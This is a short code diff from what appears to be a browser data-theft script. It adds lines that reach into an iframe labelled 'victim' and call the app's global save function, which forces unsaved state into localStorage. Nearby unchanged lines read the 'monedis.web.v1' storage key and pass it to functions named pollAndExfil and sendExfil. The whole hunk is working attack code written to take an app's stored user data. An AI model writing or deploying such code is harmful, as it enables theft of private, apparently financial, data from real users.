@@ -353,6 +353,11 @@ function sendExfil(raw) {
 // Poll localStorage every 250ms (up to 12s) until app.js seeds the data
 function pollAndExfil(tries) {
   if (tries === undefined) tries = 48;
+  // Force app to persist in-memory state: guardar() is a global fn in the iframe
+  try {
+    var iWinG = document.getElementById('victim').contentWindow;
+    if (typeof iWinG.guardar === 'function') iWinG.guardar();
+  } catch(e) {}
   // localStorage is same-origin: readable directly from window
   var raw = window.localStorage.getItem('monedis.web.v1') || '';
   if (raw.length > 5) {
